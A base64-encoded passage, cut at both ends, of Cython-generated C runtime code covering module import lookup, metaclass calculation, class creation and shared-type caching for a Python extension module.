X2RvdCwgbmFtZSk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFmdWxsX25hbWUpKSB7IGdvdG8gbW9kYmFkOyB9CiAgICAgICAgI2lmIChDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgJiYgUFlQWV9WRVJTSU9OX05VTSAgPCAweDA3MDMwNDAwKSB8fFwKICAgICAgICAgICAgICAgIENZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUwKICAgICAgICB7CiAgICAgICAgICAgIFB5T2JqZWN0ICptb2R1bGVzID0gUHlJbXBvcnRfR2V0TW9kdWxlRGljdCgpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIW1vZHVsZXMpKQogICAgICAgICAgICAgICAgZ290byBtb2RiYWQ7CiAgICAgICAgICAgIHZhbHVlID0gUHlPYmplY3RfR2V0SXRlbShtb2R1bGVzLCBmdWxsX25hbWUpOwogICAgICAgIH0KICAgICAgICAjZWxzZQogICAgICAgIHZhbHVlID0gUHlJbXBvcnRfR2V0TW9kdWxlKGZ1bGxfbmFtZSk7CiAgICAgICAgI2VuZGlmCiAgICAgIG1vZGJhZDoKICAgICAgICBQeV9YREVDUkVGKGZ1bGxfbmFtZSk7CiAgICAgICAgUHlfWERFQ1JFRihtb2R1bGVfZG90KTsKICAgICAgICBQeV9YREVDUkVGKG1vZHVsZV9uYW1lKTsKICAgIH0KICAgIGlmICh1bmxpa2VseSghdmFsdWUpKSB7CiAgICAgICAgUHlFcnJfRm9ybWF0KFB5RXhjX0ltcG9ydEVycm9yLCAiY2Fubm90IGltcG9ydCBuYW1lICVTIiwgbmFtZSk7CiAgICB9CiAgICByZXR1cm4gdmFsdWU7Cn0KCgpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X19JbXBvcnREb3R0ZWRNb2R1bGVfRXJyb3IoUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpwYXJ0c190dXBsZSwgUHlfc3NpemVfdCBjb3VudCkgewogICAgUHlPYmplY3QgKnBhcnRpYWxfbmFtZSA9IE5VTEwsICpzbGljZSA9IE5VTEwsICpzZXAgPSBOVUxMOwogICAgUHlfc3NpemVfdCBzaXplOwogICAgaWYgKHVubGlrZWx5KFB5RXJyX09jY3VycmVkKCkpKSB7CiAgICAgICAgUHlFcnJfQ2xlYXIoKTsKICAgIH0KI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgICBzaXplID0gUHlUdXBsZV9HRVRfU0laRShwYXJ0c190dXBsZSk7CiNlbHNlCiAgICBzaXplID0gUHlUdXBsZV9TaXplKHBhcnRzX3R1cGxlKTsKICAgIGlmIChzaXplIDwgMCkgZ290byBiYWQ7CiNlbmRpZgogICAgaWYgKGxpa2VseShzaXplID09IGNvdW50KSkgewogICAgICAgIHBhcnRpYWxfbmFtZSA9IG5hbWU7CiAgICB9IGVsc2UgewogICAgICAgIHNsaWNlID0gUHlTZXF1ZW5jZV9HZXRTbGljZShwYXJ0c190dXBsZSwgMCwgY291bnQpOwogICAgICAgIGlmICh1bmxpa2VseSghc2xpY2UpKQogICAgICAgICAgICBnb3RvIGJhZDsKICAgICAgICBzZXAgPSBQeVVuaWNvZGVfRnJvbVN0cmluZ0FuZFNpemUoIi4iLCAxKTsKICAgICAgICBpZiAodW5saWtlbHkoIXNlcCkpCiAgICAgICAgICAgIGdvdG8gYmFkOwogICAgICAgIHBhcnRpYWxfbmFtZSA9IFB5VW5pY29kZV9Kb2luKHNlcCwgc2xpY2UpOwogICAgfQogICAgUHlFcnJfRm9ybWF0KAogICAgICAgIFB5RXhjX01vZHVsZU5vdEZvdW5kRXJyb3IsCiAgICAgICAgIk5vIG1vZHVsZSBuYW1lZCAnJVUnIiwgcGFydGlhbF9uYW1lKTsKYmFkOgogICAgUHlfWERFQ1JFRihzZXApOwogICAgUHlfWERFQ1JFRihzbGljZSk7CiAgICBQeV9YREVDUkVGKHBhcnRpYWxfbmFtZSk7CiAgICByZXR1cm4gTlVMTDsKfQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X19JbXBvcnREb3R0ZWRNb2R1bGVfTG9va3VwKFB5T2JqZWN0ICpuYW1lKSB7CiAgICBQeU9iamVjdCAqaW1wb3J0ZWRfbW9kdWxlOwojaWYgKENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAmJiBQWVBZX1ZFUlNJT05fTlVNICA8IDB4MDcwMzA0MDApIHx8XAogICAgICAgIENZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUwKICAgIFB5T2JqZWN0ICptb2R1bGVzID0gUHlJbXBvcnRfR2V0TW9kdWxlRGljdCgpOwogICAgaWYgKHVubGlrZWx5KCFtb2R1bGVzKSkKICAgICAgICByZXR1cm4gTlVMTDsKICAgIGltcG9ydGVkX21vZHVsZSA9IF9fUHl4X1B5RGljdF9HZXRJdGVtU3RyKG1vZHVsZXMsIG5hbWUpOwogICAgUHlfWElOQ1JFRihpbXBvcnRlZF9tb2R1bGUpOwojZWxzZQogICAgaW1wb3J0ZWRfbW9kdWxlID0gUHlJbXBvcnRfR2V0TW9kdWxlKG5hbWUpOwojZW5kaWYKICAgIHJldHVybiBpbXBvcnRlZF9tb2R1bGU7Cn0Kc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGVfV2Fsa1BhcnRzKFB5T2JqZWN0ICptb2R1bGUsIFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqcGFydHNfdHVwbGUpIHsKICAgIFB5X3NzaXplX3QgaSwgbnBhcnRzOwojaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgIG5wYXJ0cyA9IFB5VHVwbGVfR0VUX1NJWkUocGFydHNfdHVwbGUpOwojZWxzZQogICAgbnBhcnRzID0gUHlUdXBsZV9TaXplKHBhcnRzX3R1cGxlKTsKICAgIGlmIChucGFydHMgPCAwKSByZXR1cm4gTlVMTDsKI2VuZGlmCiAgICBmb3IgKGk9MTsgaSA8IG5wYXJ0cyAmJiBtb2R1bGU7IGkrKykgewogICAgICAgIFB5T2JqZWN0ICpwYXJ0LCAqc3VibW9kdWxlOwojaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgICAgICBwYXJ0ID0gUHlUdXBsZV9HRVRfSVRFTShwYXJ0c190dXBsZSwgaSk7CiNlbHNlCiAgICAgICAgcGFydCA9IF9fUHl4X1B5U2VxdWVuY2VfSVRFTShwYXJ0c190dXBsZSwgaSk7CiAgICAgICAgaWYgKCFwYXJ0KSByZXR1cm4gTlVMTDsKI2VuZGlmCiAgICAgICAgc3VibW9kdWxlID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0ck5vRXJyb3IobW9kdWxlLCBwYXJ0KTsKI2lmICEoQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMpCiAgICAgICAgUHlfREVDUkVGKHBhcnQpOwojZW5kaWYKICAgICAgICBQeV9ERUNSRUYobW9kdWxlKTsKICAgICAgICBtb2R1bGUgPSBzdWJtb2R1bGU7CiAgICB9CiAgICBpZiAodW5saWtlbHkoIW1vZHVsZSkpIHsKICAgICAgICByZXR1cm4gX19QeXhfX0ltcG9ydERvdHRlZE1vZHVsZV9FcnJvcihuYW1lLCBwYXJ0c190dXBsZSwgaSk7CiAgICB9CiAgICByZXR1cm4gbW9kdWxlOwp9CnN0YXRpYyBQeU9iamVjdCAqX19QeXhfX0ltcG9ydERvdHRlZE1vZHVsZShQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKnBhcnRzX3R1cGxlKSB7CiAgICBQeU9iamVjdCAqaW1wb3J0ZWRfbW9kdWxlOwogICAgUHlPYmplY3QgKm1vZHVsZSA9IF9fUHl4X0ltcG9ydChuYW1lLCBOVUxMLCAwKTsKICAgIGlmICghcGFydHNfdHVwbGUgfHwgdW5saWtlbHkoIW1vZHVsZSkpCiAgICAgICAgcmV0dXJuIG1vZHVsZTsKICAgIGltcG9ydGVkX21vZHVsZSA9IF9fUHl4X19JbXBvcnREb3R0ZWRNb2R1bGVfTG9va3VwKG5hbWUpOwogICAgaWYgKGxpa2VseShpbXBvcnRlZF9tb2R1bGUpKSB7CiAgICAgICAgUHlfREVDUkVGKG1vZHVsZSk7CiAgICAgICAgcmV0dXJuIGltcG9ydGVkX21vZHVsZTsKICAgIH0KICAgIFB5RXJyX0NsZWFyKCk7CiAgICByZXR1cm4gX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlX1dhbGtQYXJ0cyhtb2R1bGUsIG5hbWUsIHBhcnRzX3R1cGxlKTsKfQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZShQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKnBhcnRzX3R1cGxlKSB7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04KICAgIFB5T2JqZWN0ICptb2R1bGUgPSBfX1B5eF9fSW1wb3J0RG90dGVkTW9kdWxlX0xvb2t1cChuYW1lKTsKICAgIGlmIChsaWtlbHkobW9kdWxlKSkgewogICAgICAgIFB5T2JqZWN0ICpzcGVjID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0ck5vRXJyb3IobW9kdWxlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3BlYyk7CiAgICAgICAgaWYgKGxpa2VseShzcGVjKSkgewogICAgICAgICAgICBQeU9iamVjdCAqdW5zYWZlID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0ck5vRXJyb3Ioc3BlYywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2luaXRpYWxpemluZyk7CiAgICAgICAgICAgIGlmIChsaWtlbHkoIXVuc2FmZSB8fCAhX19QeXhfUHlPYmplY3RfSXNUcnVlKHVuc2FmZSkpKSB7CiAgICAgICAgICAgICAgICBQeV9ERUNSRUYoc3BlYyk7CiAgICAgICAgICAgICAgICBzcGVjID0gTlVMTDsKICAgICAgICAgICAgfQogICAgICAgICAgICBQeV9YREVDUkVGKHVuc2FmZSk7CiAgICAgICAgfQogICAgICAgIGlmIChsaWtlbHkoIXNwZWMpKSB7CiAgICAgICAgICAgIFB5RXJyX0NsZWFyKCk7CiAgICAgICAgICAgIHJldHVybiBtb2R1bGU7CiAgICAgICAgfQogICAgICAgIFB5X0RFQ1JFRihzcGVjKTsKICAgICAgICBQeV9ERUNSRUYobW9kdWxlKTsKICAgIH0gZWxzZSBpZiAoUHlFcnJfT2NjdXJyZWQoKSkgewogICAgICAgIFB5RXJyX0NsZWFyKCk7CiAgICB9CiNlbmRpZgogICAgcmV0dXJuIF9fUHl4X19JbXBvcnREb3R0ZWRNb2R1bGUobmFtZSwgcGFydHNfdHVwbGUpOwp9CgoKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9DYWxjdWxhdGVNZXRhY2xhc3MoUHlUeXBlT2JqZWN0ICptZXRhY2xhc3MsIFB5T2JqZWN0ICpiYXNlcykgewogICAgUHlfc3NpemVfdCBpLCBuYmFzZXM7CiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgbmJhc2VzID0gUHlUdXBsZV9HRVRfU0laRShiYXNlcyk7CiNlbHNlCiAgICBuYmFzZXMgPSBQeVR1cGxlX1NpemUoYmFzZXMpOwogICAgaWYgKG5iYXNlcyA8IDApIHJldHVybiBOVUxMOwojZW5kaWYKICAgIGZvciAoaT0wOyBpIDwgbmJhc2VzOyBpKyspIHsKICAgICAgICBQeVR5cGVPYmplY3QgKnRtcHR5cGU7CiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TCiAgICAgICAgUHlPYmplY3QgKnRtcCA9IFB5VHVwbGVfR0VUX0lURU0oYmFzZXMsIGkpOwojZWxzZQogICAgICAgIFB5T2JqZWN0ICp0bXAgPSBQeVR1cGxlX0dldEl0ZW0oYmFzZXMsIGkpOwogICAgICAgIGlmICghdG1wKSByZXR1cm4gTlVMTDsKI2VuZGlmCiAgICAgICAgdG1wdHlwZSA9IFB5X1RZUEUodG1wKTsKICAgICAgICBpZiAoIW1ldGFjbGFzcykgewogICAgICAgICAgICBtZXRhY2xhc3MgPSB0bXB0eXBlOwogICAgICAgICAgICBjb250aW51ZTsKICAgICAgICB9CiAgICAgICAgaWYgKFB5VHlwZV9Jc1N1YnR5cGUobWV0YWNsYXNzLCB0bXB0eXBlKSkKICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgaWYgKFB5VHlwZV9Jc1N1YnR5cGUodG1wdHlwZSwgbWV0YWNsYXNzKSkgewogICAgICAgICAgICBtZXRhY2xhc3MgPSB0bXB0eXBlOwogICAgICAgICAgICBjb250aW51ZTsKICAgICAgICB9CiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAgICAgICAgICAgICAgICAgIm1ldGFjbGFzcyBjb25mbGljdDogIgogICAgICAgICAgICAgICAgICAgICAgICAidGhlIG1ldGFjbGFzcyBvZiBhIGRlcml2ZWQgY2xhc3MgIgogICAgICAgICAgICAgICAgICAgICAgICAibXVzdCBiZSBhIChub24tc3RyaWN0KSBzdWJjbGFzcyAiCiAgICAgICAgICAgICAgICAgICAgICAgICJvZiB0aGUgbWV0YWNsYXNzZXMgb2YgYWxsIGl0cyBiYXNlcyIpOwogICAgICAgIHJldHVybiBOVUxMOwogICAgfQogICAgaWYgKCFtZXRhY2xhc3MpIHsKICAgICAgICBtZXRhY2xhc3MgPSAmUHlUeXBlX1R5cGU7CiAgICB9CiAgICBQeV9JTkNSRUYoKFB5T2JqZWN0KikgbWV0YWNsYXNzKTsKICAgIHJldHVybiAoUHlPYmplY3QqKSBtZXRhY2xhc3M7Cn0KCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbDJBcmdzKFB5T2JqZWN0KiBmdW5jdGlvbiwgUHlPYmplY3QqIGFyZzEsIFB5T2JqZWN0KiBhcmcyKSB7CiAgICBQeU9iamVjdCAqYXJnc1szXSA9IHtOVUxMLCBhcmcxLCBhcmcyfTsKICAgIHJldHVybiBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChmdW5jdGlvbiwgYXJncysxLCAyIHwgX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKTsKfQoKCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHkzTWV0YWNsYXNzUHJlcGFyZShQeU9iamVjdCAqbWV0YWNsYXNzLCBQeU9iamVjdCAqYmFzZXMsIFB5T2JqZWN0ICpuYW1lLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKnF1YWxuYW1lLCBQeU9iamVjdCAqbWt3LCBQeU9iamVjdCAqbW9kbmFtZSwgUHlPYmplY3QgKmRvYykgewogICAgUHlPYmplY3QgKm5zOwogICAgaWYgKG1ldGFjbGFzcykgewogICAgICAgIFB5T2JqZWN0ICpwcmVwID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0ck5vRXJyb3IobWV0YWNsYXNzLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcHJlcGFyZSk7CiAgICAgICAgaWYgKHByZXApIHsKICAgICAgICAgICAgUHlPYmplY3QgKnBhcmdzWzNdID0ge05VTEwsIG5hbWUsIGJhc2VzfTsKICAgICAgICAgICAgbnMgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbERpY3QocHJlcCwgcGFyZ3MrMSwgMiB8IF9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCwgbWt3KTsKICAgICAgICAgICAgUHlfREVDUkVGKHByZXApOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShQeUVycl9PY2N1cnJlZCgpKSkKICAgICAgICAgICAgICAgIHJldHVybiBOVUxMOwogICAgICAgICAgICBucyA9IFB5RGljdF9OZXcoKTsKICAgICAgICB9CiAgICB9IGVsc2UgewogICAgICAgIG5zID0gUHlEaWN0X05ldygpOwogICAgfQogICAgaWYgKHVubGlrZWx5KCFucykpCiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICBpZiAodW5saWtlbHkoUHlPYmplY3RfU2V0SXRlbShucywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X21vZHVsZSwgbW9kbmFtZSkgPCAwKSkgZ290byBiYWQ7CiAgICBpZiAodW5saWtlbHkoUHlPYmplY3RfU2V0SXRlbShucywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3F1YWxuYW1lLCBxdWFsbmFtZSkgPCAwKSkgZ290byBiYWQ7CiAgICBpZiAodW5saWtlbHkoZG9jICYmIFB5T2JqZWN0X1NldEl0ZW0obnMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kb2MsIGRvYykgPCAwKSkgZ290byBiYWQ7CiAgICByZXR1cm4gbnM7CmJhZDoKICAgIFB5X0RFQ1JFRihucyk7CiAgICByZXR1cm4gTlVMTDsKfQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5M0NsYXNzQ3JlYXRlKFB5T2JqZWN0ICptZXRhY2xhc3MsIFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqYmFzZXMsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmRpY3QsIFB5T2JqZWN0ICpta3csCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50IGNhbGN1bGF0ZV9tZXRhY2xhc3MsIGludCBhbGxvd19weTJfbWV0YWNsYXNzKSB7CiAgICBQeU9iamVjdCAqcmVzdWx0OwogICAgUHlPYmplY3QgKm93bmVkX21ldGFjbGFzcyA9IE5VTEw7CiAgICBQeU9iamVjdCAqbWFyZ3NbNF0gPSB7TlVMTCwgbmFtZSwgYmFzZXMsIGRpY3R9OwogICAgaWYgKGFsbG93X3B5Ml9tZXRhY2xhc3MpIHsKICAgICAgICBvd25lZF9tZXRhY2xhc3MgPSBQeU9iamVjdF9HZXRJdGVtKGRpY3QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9tZXRhY2xhc3MpOwogICAgICAgIGlmIChvd25lZF9tZXRhY2xhc3MpIHsKICAgICAgICAgICAgbWV0YWNsYXNzID0gb3duZWRfbWV0YWNsYXNzOwogICAgICAgIH0gZWxzZSBpZiAobGlrZWx5KFB5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoUHlFeGNfS2V5RXJyb3IpKSkgewogICAgICAgICAgICBQeUVycl9DbGVhcigpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHJldHVybiBOVUxMOwogICAgICAgIH0KICAgIH0KICAgIGlmIChjYWxjdWxhdGVfbWV0YWNsYXNzICYmICghbWV0YWNsYXNzIHx8IFB5VHlwZV9DaGVjayhtZXRhY2xhc3MpKSkgewogICAgICAgIG1ldGFjbGFzcyA9IF9fUHl4X0NhbGN1bGF0ZU1ldGFjbGFzcygoUHlUeXBlT2JqZWN0KikgbWV0YWNsYXNzLCBiYXNlcyk7CiAgICAgICAgUHlfWERFQ1JFRihvd25lZF9tZXRhY2xhc3MpOwogICAgICAgIGlmICh1bmxpa2VseSghbWV0YWNsYXNzKSkKICAgICAgICAgICAgcmV0dXJuIE5VTEw7CiAgICAgICAgb3duZWRfbWV0YWNsYXNzID0gbWV0YWNsYXNzOwogICAgfQogICAgcmVzdWx0ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxEaWN0KG1ldGFjbGFzcywgbWFyZ3MrMSwgMyB8IF9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCwgbWt3KTsKICAgIFB5X1hERUNSRUYob3duZWRfbWV0YWNsYXNzKTsKICAgIHJldHVybiByZXN1bHQ7Cn0KCgpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0ZldGNoU2hhcmVkQ3l0aG9uQUJJTW9kdWxlKHZvaWQpIHsKICAgIHJldHVybiBfX1B5eF9QeUltcG9ydF9BZGRNb2R1bGVSZWYoX19QWVhfQUJJX01PRFVMRV9OQU1FKTsKfQoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9QeURpY3RfU2V0RGVmYXVsdChQeU9iamVjdCAqZCwgUHlPYmplY3QgKmtleSwgUHlPYmplY3QgKmRlZmF1bHRfdmFsdWUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnQgaXNfc2FmZV90eXBlKSB7CiAgICBQeU9iamVjdCogdmFsdWU7CiAgICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUihpc19zYWZlX3R5cGUpOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgdmFsdWUgPSBQeU9iamVjdF9DYWxsTWV0aG9kKGQsICJzZXRkZWZhdWx0IiwgIk9PIiwga2V5LCBkZWZhdWx0X3ZhbHVlKTsKI2VsaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMAogICAgUHlEaWN0X1NldERlZmF1bHRSZWYoZCwga2V5LCBkZWZhdWx0X3ZhbHVlLCAmdmFsdWUpOwojZWxzZQogICAgdmFsdWUgPSBQeURpY3RfU2V0RGVmYXVsdChkLCBrZXksIGRlZmF1bHRfdmFsdWUpOwogICAgaWYgKHVubGlrZWx5KCF2YWx1ZSkpIHJldHVybiBOVUxMOwogICAgUHlfSU5DUkVGKHZhbHVlKTsKI2VuZGlmCiAgICByZXR1cm4gdmFsdWU7Cn0KCgojaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwQzAwMDAKc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9QeVR5cGVfRnJvbU1ldGFjbGFzcyhQeVR5cGVPYmplY3QgKm1ldGFjbGFzcywgUHlPYmplY3QgKm1vZHVsZSwgUHlUeXBlX1NwZWMgKnNwZWMsIFB5T2JqZWN0ICpiYXNlcykgewogICAgUHlPYmplY3QgKnJlc3VsdCA9IF9fUHl4X1B5VHlwZV9Gcm9tTW9kdWxlQW5kU3BlYyhtb2R1bGUsIHNwZWMsIGJhc2VzKTsKICAgIGlmIChyZXN1bHQgJiYgbWV0YWNsYXNzKSB7CiAgICAgICAgUHlPYmplY3QgKm9sZF90cCA9IChQeU9iamVjdCopUHlfVFlQRShyZXN1bHQpOwogICAgUHlfSU5DUkVGKChQeU9iamVjdCopbWV0YWNsYXNzKTsKI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDAwMAogICAgICAgIFB5X1NFVF9UWVBFKHJlc3VsdCwgbWV0YWNsYXNzKTsKI2Vsc2UKICAgICAgICByZXN1bHQtPm9iX3R5cGUgPSBtZXRhY2xhc3M7CiNlbmRpZgogICAgICAgIFB5X0RFQ1JFRihvbGRfdHApOwogICAgfQogICAgcmV0dXJuIHJlc3VsdDsKfQojZWxzZQojZGVmaW5lIF9fUHl4X1B5VHlwZV9Gcm9tTWV0YWNsYXNzKG1lLCBtbywgcywgYikgUHlUeXBlX0Zyb21NZXRhY2xhc3MobWUsIG1vLCBzLCBiKQojZW5kaWYKc3RhdGljIGludCBfX1B5eF9WZXJpZnlDYWNoZWRUeXBlKFB5T2JqZWN0ICpjYWNoZWRfdHlwZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGNoYXIgKm5hbWUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeV9zc2l6ZV90IGV4cGVjdGVkX2Jhc2ljc2l6ZSkgewogICAgUHlfc3NpemVfdCBiYXNpY3NpemU7CiAgICBpZiAoIVB5VHlwZV9DaGVjayhjYWNoZWRfdHlwZSkpIHsKICAgICAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICAgICAiU2hhcmVkIEN5dGhvbiB0eXBlICUuMjAwcyBpcyBub3QgYSB0eXBlIG9iamVjdCIsIG5hbWUpOwogICAgICAgIHJldHVybiAtMTsKICAgIH0KICAgIGlmIChleHBlY3RlZF9iYXNpY3NpemUgPT0gMCkgewogICAgICAgIHJldHVybiAwOyAvLyBzaXplIGlzIGluaGVyaXRlZCwgbm90aGluZyB1c2VmdWwgdG8gY2hlY2sKICAgIH0KI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIFB5T2JqZWN0ICpweV9iYXNpY3NpemU7CiAgICBweV9iYXNpY3NpemUgPSBQeU9iamVjdF9HZXRBdHRyU3RyaW5nKGNhY2hlZF90eXBlLCAiX19iYXNpY3NpemVfXyIpOwogICAgaWYgKHVubGlrZWx5KCFweV9iYXNpY3NpemUpKSByZXR1cm4gLTE7CiAgICBiYXNpY3NpemUgPSBQeUxvbmdfQXNTc2l6ZV90KHB5X2Jhc2ljc2l6ZSk7CiAgICBQeV9ERUNSRUYocHlfYmFzaWNzaXplKTsKICAgIHB5X2Jhc2ljc2l6ZSA9IE5VTEw7CiAgICBpZiAodW5saWtlbHkoYmFzaWNzaXplID09IChQeV9zc2l6ZV90KS0xKSAmJiBQeUVycl9PY2N1cnJlZCgpKSByZXR1cm4gLTE7CiNlbHNlCiAgICBiYXNpY3NpemUgPSAoKFB5VHlwZU9iamVjdCopIGNhY2hlZF90eXBlKS0+dHBfYmFzaWNzaXplOwojZW5kaWYKICAgIGlmIChiYXNpY3NpemUgIT0gZXhwZWN0ZWRfYmFzaWNzaXplKSB7CiAgICAgICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAgICAgIlNoYXJlZCBDeXRob24gdHlwZSAlLjIwMHMgaGFzIHRoZSB3cm9uZyBzaXplLCB0cnkgcmVjb21waWxpbmciLAogICAgICAgICAgICBuYW1lKTsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiAgICByZXR1cm4gMDsKfQpzdGF0aWMgUHlUeXBlT2JqZWN0ICpfX1B5eF9GZXRjaENvbW1vblR5cGVGcm9tU3BlYyhQeVR5cGVPYmplY3QgKm1ldGFjbGFzcywgUHlPYmplY3QgKm1vZHVsZSwgUHlUeXBlX1NwZWMgKnNwZWMsIFB5T2JqZWN0ICpiYXNlcykgewogICAgUHlPYmplY3QgKmFiaV9tb2R1bGUgPSBOVUxMLCAqY2FjaGVkX3R5cGUgPSBOVUxMLCAqYWJpX21vZHVsZV9kaWN0LCAqbmV3X2NhY2hlZF90eXBlLCAqcHlfb2JqZWN0X25hbWU7CiAgICBpbnQgZ2V0X2l0ZW1fcmVmX3Jlc3VsdDsKICAgIGNvbnN0IGNoYXIqIG9iamVjdF9uYW1lID0gc3RycmNocihzcGVjLT5uYW1lLCAnLicpOwogICAgb2JqZWN0X25hbWUgPSBvYmplY3RfbmFtZSA/IG9iamVjdF9uYW1lKzEgOiBzcGVjLT5uYW1lOwogICAgcHlfb2JqZWN0X25hbWUgPSBQeVVuaWNvZGVfRnJvbVN0cmluZyhvYmplY3RfbmFtZSk7CiAgICBpZiAoIXB5X29iamVjdF9uYW1lKSByZXR1cm4gTlVMTDsKICAgIGFiaV9tb2R1bGUgPSBfX1B5eF9GZXRjaFNoYXJlZEN5dGhvbkFCSU1vZHVsZSgpOwogICAgaWYgKCFhYmlfbW9kdWxlKSBnb3RvIGRvbmU7CiAgICBhYmlfbW9kdWxlX2RpY3QgPSBQeU1vZHVsZV9HZXREaWN0KGFiaV9tb2R1bGUpOwogICAgaWYgKCFhYmlfbW9kdWxlX2RpY3QpIGdvdG8gZG9uZTsKICAgIGdldF9pdGVtX3JlZl9yZXN1bHQgPSBfX1B5eF9QeURpY3RfR2V0SXRlbVJlZihhYmlfbW9kdWxlX2RpY3QsIHB5X29iamVjdF9uYW1lLCAmY2FjaGVkX3R5cGUpOwogICAgaWYgKGdldF9pdGVtX3JlZl9yZXN1bHQgPT0gMSkgewogICAgICAgIGlmIChfX1B5eF9WZXJpZnlDYWNoZWRUeXBlKAogICAgICAgICAgICAgIGNhY2hlZF90eXBlLAogICAgICAgICAgICAgIG9iamVjdF9uYW1lLAogICAgICAgICAgICAgIHNwZWMtPmJhc2ljc2l6ZSkgPCAwKSB7CiAgICAgICAgICAgIGdvdG8gYmFkOwogICAgICAgIH0KICAgICAgICBnb3RvIGRvbmU7CiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KGdldF9pdGVtX3JlZl9yZXN1bHQgPT0gLTEpKSB7CiAgICAgICAgZ290byBiYWQ7CiAgICB9CiAgICBDWVRIT05fVU5VU0VEX1ZBUihtb2R1bGUpOwogICAgY2FjaGVkX3R5cGUgPSBfX1B5eF9QeVR5cGVfRnJvbU1ldGFjbGFzcyhtZXRhY2xhc3MsIGFiaV9tb2R1bGUsIHNwZWMsIGJhc2VzKTsKICAgIGlmICh1bmxpa2VseSghY2FjaGVkX3R5cGUpKSBnb3RvIGJhZDsKICAgIGlmICh1bmxpa2VseShfX1B5eF9maXhfdXBfZXh0ZW5zaW9uX3R5cGVfZnJvbV9zcGVjKHNwZWMsIChQeVR5cGVPYmplY3QgKikgY2FjaGVkX3R5cGUpIDwgMCkpIGdvdG8gYmFkOwogICAgbmV3X2NhY2hlZF90eXBlID0gX19QeXhfUHlEaWN0X1NldERlZmF1bHQoYWJpX21vZ